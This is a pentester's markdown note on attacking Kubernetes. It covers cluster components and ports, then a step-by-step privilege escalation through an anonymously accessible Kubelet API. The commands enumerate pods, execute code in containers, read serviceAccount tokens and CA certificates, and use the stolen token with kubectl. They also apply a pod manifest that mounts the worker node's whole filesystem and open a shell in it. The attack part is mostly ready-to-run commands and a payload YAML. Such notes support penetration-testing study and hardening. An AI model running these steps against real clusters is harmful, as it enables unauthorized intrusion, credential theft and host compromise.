---
Primary_category: "[[LINUX PRIVESC]]"
title: K8S ABUSE
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp&nbsp;&nbsp;[[WEB TECHNOLOGIES]]

#### *Theory*

Also know as ***Kubernetes***

##### *General Structure*

> [!IMPORTANT]- *K8S Structure*
>
> ```bash
> [ CLUSTER A ]
>    │
>    ├── [ CONTROL PLANE ] ( Cluster Management Software )
>    │       ├── API Server
>    │       └── Scheduler
>    │
>    └── [ WORKER 1 ] ( Physical Machine )
>    │    ├── Kubelet ( Agent )
>    │    ├── POD A ( Nginx + Git-Sync ) <-- Both containers here
>    │    └── POD B (Java App)
>    │
>    └── [ WORKER 2 ] ( Physical Machine )
>         ├── Kubelet ( Agent )
>         └── POD A-2 ( Nginx + Git-Sync Replica )
> ```
>

##### *Components*

###### *Cluster*

A set of nodes, typically composed of a *Master Node ( Control Plane )* and several *Worker Nodes*

###### *Node*

Basic unit within a ***[[#Cluster]]***, it can be either a *Control Plane* or a *Worker Node*

###### *Control Plane*

> ***Master Node***

It is the node responsible for controlling the given *K8S* cluster. It manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained

The *Control Plane* serves as the management layer. It consists of several crucial components →

| **SERVICE** | **TCP PORT\[s\]** |
| --- | --- |
| **`etcd`** | ***2379 <br> 2380*** |
| **`API Server`** | ***6443*** |
| **`Scheduler`** | ***10251*** |
| **`Controller Manager`** | ***10252*** |
| **`Kubelet API`** | ***10250*** |
| **`Read-Only Kubelet API`** |***10255*** |

###### *Minions*

> ***Worker Nodes***

They serve as the designated location for the running applications. All nodes are managed and regulated by the ***[[#Control Plane]]***

They are basically *physical hosts* where *PODS ( set of containers )* are located

###### *POD*

A set of one or more containers located within a ***[[#Minions|Worder Node]]***

---

#### *Enumeration - K8S API Server*

> ***Port 6443***

We cannot interact with the *K8S' API REST* unless we have valid credentials

If not, we will receive a *403 Forbidden* error

```bash
curl --insecure --silent --location --request GET 'https://<TARGET>:6443'
```

---

#### *Enumeration - Kubelet API*

> ***Port 10250***

Unlike the ***[[#Enumeration - K8S API Server|K8S API Server]]***, it allows, by default, anonymous authentication, so an operator could send several requests to the *Kubelet* of the given *Worker Node* in order to list the existing *PODs*, ***[[#Command Execution on a Container|run system commands]]*** on them and so on

##### *PODs Extraction*

We can gather interesting information from the output of the command below by inspecting fields such as *container images*, *namespaces*, *last applied configurations* and so on

###### *Curl*

```bash
curl --insecure --silent --location --request GET 'https://<TARGET>:10250/pods' | jq .
```

###### *Kubeletctl*

> ***[Kubeletctl](https://github.com/cyberark/kubeletctl)***

- ***Setup***

```bash
curl --silent --location --request GET 'https://github.com/cyberark/kubeletctl/releases/download/v1.13/kubeletctl_linux_amd64' --output kubeletctl
```

```bash
chmod 700 !$
```

- ***Usage***

```bash
./kubeletctl --ignoreconfig --server <TARGET> pods
```

##### *Scanning for Vulnerable PODs*

> ***RCE***

###### *Kubeletctl*

> ***[Kubeletctl](https://github.com/cyberark/kubeletctl)***

```bash
./kubeletctl --ignoreconfig --server <TARGET> scan rce
```

---

#### *Abuse*

As stated, since a ***[[#Enumeration - Kubelet API|Kubelet API]]*** allows anoymous authentication by default, an operator could perform several sensitive actions in order to escalate its privileges

Let's suppose an adversary compromises a web application, which is running within a *K8S* container, and gain remote access to it through a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]*** by leveraging an arbitrary ***[[FILE UPLOAD|File Upload]]***

Then, the attacker carries out a ***[[NETWORK ENUMERATION|Network Enumeration]]*** on the existing subnets and discovers the *Worker Node* IP Address.

In addition, the *TCP port 10250* related to the *Kubelet API REST* of the *Worker Node* is open and accesible

So, since this *API REST* allows anonymous authentication by default, he can ***[[#PODs Extraction|list the existing PODs]]*** and its namespaces *( containers )*

##### *Command Execution on a POD's Container*

Once the operator knows the name of any *POD* and its container[s], system commands can be executed on any of them as follows

###### *Kubeletctl*

> ***[Kubeletctl](https://github.com/cyberark/kubeletctl)***

```bash
./kubeletctl --ignoreconfig --server <TARGET> exec '<COMMAND>' --pod <POD_NAME> --container <CONTAINER_NAME>
```

##### *Tokens Extraction*

By default, each *POD* has a *serviceAccount* token on the following path

```bash
/var/run/secrets/kubernetes.io/serviceaccount/<SERVICE_ACCOUNT>/<TOKEN>
```

It is a *JWT* and it identifies the given *POD* across the entire *Cluster*

Once we have extract the token, we can use it to authenticate to the ***[[#Enumeration - K8S API Server|K8S API REST]]***

In order to grab the content of the token for a given *POD*, proceed as follows

###### *Kubeletctl*

> ***[Kubeletctl](https://github.com/cyberark/kubeletctl)***

```bash
./kubeletctl --ignoreconfig --server <TARGET> exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' --pod <POD_NAME> --container <CONTAINER_NAME>
```

##### *Certificates Extraction*

Similarly, we must extract the *CA Certificate* in order to stablish a valid *TLS* connection to the *Control Plane's ( Master Node ) API Server ( K8S Api Server →  Port  6443 )*

To do so, proceed as follows

###### *Kubeletctl*

> ***[Kubeletctl](https://github.com/cyberark/kubeletctl)***

```bash
./kubeletctl --ignoreconfig --server <TARGET> exec 'cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt' --pod <POD_NAME> --container <CONTAINER_NAME>
```

As stated, once we have both the *POD serviceAccount's Token* and the *CA Certificate*, we can authenticate to the *K8S API REST* as the given *serviceAccount*, which identifies the *POD*

Therefore, we can enumerate sensitive aspects of the infrastructure

##### *Listing Privileges*

To do so, we provide the *token* and the *CA Certificate* as follows

###### *Kubectl*

> ***[Kubectl](https://github.com/kubernetes/kubectl)***

```bash
kubectl --server=https://<TARGET>:6443 --token=<TOKEN> --certificate-authority=<CA_CRT> auth can-i --list
```

##### *Creating a new POD*

Let's suppose that we have listed the privileges related to the provided token and we discover that we can get, **create** and list *PODS* within the *Worker Node ( Minion )*

So, we can proceed in a similar way to how we do when we have permissions to create ***[[LINUX PRIVILEGED GROUPS#Docker|Docker]]*** or ***[[LINUX PRIVILEGED GROUPS#LXC LXD|LXD]]*** containers

That is, we can use a *YML* file to create a new *POD* consisting of a single container and mount the entire *Worker Node's* filesystem into this container

From there, we could access any hosts system directory and file, so the host is compromised along with the existing *PODs* and containers within it

###### *YML File*

> [!BUG]- *YML POD File*
>
> ```bash
> apiVersion: v1
> kind: Pod
> metadata:
>   name: privesc
>   namespace: default
> spec:
>   containers:
>   - name: privesc
>     image: nginx:1.14.2
>     volumeMounts:
>     - mountPath: /root
>       name: mount-root-into-mnt
>   volumes:
>   - name: mount-root-into-mnt
>     hostPath:
>        path: /
>   automountServiceAccountToken: true
>   hostNetwork: true
> ```
>

###### *POD Creation*

- ***Kubectl***

> ***[Kubectl](https://github.com/kubernetes/kubectl)***

```bash
kubectl --server=https://>TARGET>:6443 --token=<TOKEN> --certificate-authority=<CA_CRT> apply -f <YML_FILE>
```

###### *Listing the existing PODS*

- ***Kubectl***

> ***[Kubectl](https://github.com/kubernetes/kubectl)***

```bash
kubectl --server=https://>TARGET>:6443 --token=<TOKEN> --certificate-authority=<CA_CRT> get pods
```

##### *Command Execution on the created POD's Container*

Once the container is created, we can run ***[[#Command Execution on a POD's Container|system commands]]***

Similarly, we can access the container interactively as follows

- ***Kubectl***

> ***[Kubectl](https://github.com/kubernetes/kubectl)***

```bash
kubectl --server=https://>TARGET>:6443 --token=<TOKEN> --certificate-authority=<CA_CRT> exec -it <POD_NAME> -- /bin/sh
```